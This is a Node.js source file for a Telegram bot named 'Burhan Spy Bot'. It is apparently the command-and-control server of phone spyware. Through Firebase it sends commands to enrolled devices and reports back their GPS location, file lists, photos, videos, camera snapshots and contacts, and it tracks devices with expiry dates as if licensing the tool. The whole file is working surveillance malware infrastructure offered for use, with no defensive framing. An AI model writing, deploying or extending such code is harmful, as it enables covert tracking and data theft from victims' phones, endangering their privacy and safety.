const TelegramBot = require('node-telegram-bot-api');
const admin = require('firebase-admin');
const express = require('express');

// ===== CONFIGURATION =====
const token = process.env.TOKEN;               // Telegram bot token
const YOUR_USER_ID = process.env.USER_ID;      // Your Telegram ID (string)

const bot = new TelegramBot(token, { polling: false });
const app = express();
app.use(express.json());

// ===== FIREBASE =====
let serviceAccount;
try {
  serviceAccount = require('./firebase-service-account.json');
} catch (e) {
  console.error('❌ firebase-service-account.json missing! Place it in the same folder.');
  process.exit(1);
}
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: "https://spyservice-c27e1-default-rtdb.europe-west1.firebasedatabase.app"
});
const db = admin.database();

let currentOperation = null;

function isAuthorized(msg) {
  return String(msg.from.id) === String(YOUR_USER_ID);
}

// ===== WEBHOOK =====
const PORT = process.env.PORT || 3000;
const WEBHOOK_URL = process.env.RAILWAY_PUBLIC_DOMAIN 
  ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}/webhook` 
  : null;

app.post('/webhook', (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

app.listen(PORT, async () => {
  console.log(`🚀 Server running on port ${PORT}`);
  if (WEBHOOK_URL) {
    try {
      await bot.setWebHook(WEBHOOK_URL);
      console.log(`✅ Webhook set to ${WEBHOOK_URL}`);
    } catch (e) {
      console.error('❌ Webhook set failed:', e.message);
    }
  } else {
    console.warn('⚠️ RAILWAY_PUBLIC_DOMAIN not set. Set manually.');
  }
});

// ===== COMMANDS =====
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
  currentOperation = null;
  bot.sendMessage(chatId, "🔥 Burhan Spy Bot active. Use /help.");
});

bot.onText(/\/stop/, (msg) => {
  const chatId = msg.chat.id;
  if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
  currentOperation = null;
  bot.sendMessage(chatId, "🛑 All operations cancelled. Use /start to resume.");
});

bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;
  if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
  bot.sendMessage(chatId, 
    `📜 **COMMANDS**\n` +
    `/locate <ID> - GPS + device info\n` +
    `/devices - All devices with key/expiry\n` +
    `/files <ID> - List all files\n` +
    `/getphoto <ID> <FILE> - Get photo\n` +
    `/getvideo <ID> <FILE> - Get video\n` +
    `/camera <ID> [front|back] - Snapshot\n` +
    `/ping <ID> - Check alive\n` +
    `/stats - Total device count\n` +
    `/contacts <ID> - Fetch contacts\n` +
    `/stop - Cancel + stop\n` +
    `/start - Resume\n\n` +
    `⚠️ New command cancels previous operation.`
  );
});

// ===== All other commands (copy from previous message) =====
bot.onText(/\/devices/, (msg) => {
  const chatId = msg.chat.id;
  if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
  currentOperation = 'devices';
  db.ref('devices').once('value').then(snap => {
    const devices = snap.val() || {};
    let text = `📱 ALL DEVICES (Total: ${Object.keys(devices).length})\n\n`;
    Object.entries(devices).forEach(([id, d]) => {
      text += `🔑 ID: ${id}\n`;
      text += `📅 Expiry: ${d.expiry || 'N/A'}\n`;
      text += `📊 Status: ${d.online ? "🟢 ONLINE" : "🔴 OFFLINE"}\n`;
      text += `🕒 ${d.time || 'N/A'}\n\n`;
    });
    bot.sendMessage(chatId, text);
  }).catch(err => bot.sendMessage(chatId, "❌ Error fetching devices."));
});

bot.onText(/\/stats/, (msg) => {
  const chatId = msg.chat.id;
  if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
  currentOperation = 'stats';
  db.ref('devices').once('value').then(snap => {
    bot.sendMessage(chatId, `📊 Total Devices: ${Object.keys(snap.val() || {}).length}`);
  }).catch(err => bot.sendMessage(chatId, "❌ Error."));
});

bot.onText(/\/locate (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
  const deviceId = match[1].trim();
  currentOperation = 'locate';
  db.ref('commands').child(deviceId).set('locate').then(() => {
    bot.sendMessage(chatId, `📍 Locate sent to ${deviceId}. Waiting...`);
    db.ref('devices').child(deviceId).once('value').then(snap => {
      const dev = snap.val() || {};
      if (dev.location) {
        bot.sendMessage(chatId, `📍 **Location for ${deviceId}:**\nLat: ${dev.location.lat}\nLng: ${dev.location.lng}\nTime: ${dev.location.time || 'N/A'}`);
      } else {
        bot.sendMessage(chatId, `⏳ Device hasn't reported location yet.`);
      }
    });
  }).catch(err => bot.sendMessage(chatId, "❌ Failed."));
});

bot.onText(/\/files (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
  const deviceId = match[1].trim();
  currentOperation = 'files';
  db.ref('commands').child(deviceId).set('list_files').then(() => {
    bot.sendMessage(chatId, `📂 File list request sent for ${deviceId}.`);
  }).catch(err => bot.sendMessage(chatId, "❌ Failed."));
});

bot.onText(/\/getphoto (.+) (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
  const deviceId = match[1].trim();
  const fileName = match[2].trim();
  currentOperation = 'getphoto';
  db.ref('commands').child(deviceId).set({ type: 'get_photo', file: fileName }).then(() => {
    bot.sendMessage(chatId, `📸 Photo request for ${deviceId} / ${fileName} sent.`);
  }).catch(err => bot.sendMessage(chatId, "❌ Failed."));
});

bot.onText(/\/getvideo (.+) (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
  const deviceId = match[1].trim();
  const fileName = match[2].trim();
  currentOperation = 'getvideo';
  db.ref('commands').child(deviceId).set({ type: 'get_video', file: fileName }).then(() => {
    bot.sendMessage(chatId, `📹 Video request for ${deviceId} / ${fileName} sent.`);
  }).catch(err => bot.sendMessage(chatId, "❌ Failed."));
});

bot.onText(/\/camera (.+) (front|back)?/i, (msg, match) => {
  const chatId = msg.chat.id;
  if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
  const deviceId = match[1].trim();
  const camera = (match[2] || 'back').toLowerCase();
  currentOperation = 'camera';
  db.ref('commands').child(deviceId).set({ type: 'camera', camera: camera }).then(() => {
    bot.sendMessage(chatId, `📷 Snapshot request for ${deviceId} (${camera} cam) sent.`);
  }).catch(err => bot.sendMessage(chatId, "❌ Failed."));
});

bot.onText(/\/ping (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
  const deviceId = match[1].trim();
  currentOperation = 'ping';
  db.ref('commands').child(deviceId).set('ping').then(() => {
    bot.sendMessage(chatId, `📡 Ping sent to ${deviceId}.`);
  }).catch(err => bot.sendMessage(chatId, "❌ Failed."));
});

bot.onText(/\/contacts (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
  const deviceId = match[1].trim();
  currentOperation = 'contacts';
  db.ref('commands').child(deviceId).set('get_contacts').then(() => {
    bot.sendMessage(chatId, `📞 Contacts request sent for ${deviceId}.`);
  }).catch(err => bot.sendMessage(chatId, "❌ Failed."));
});
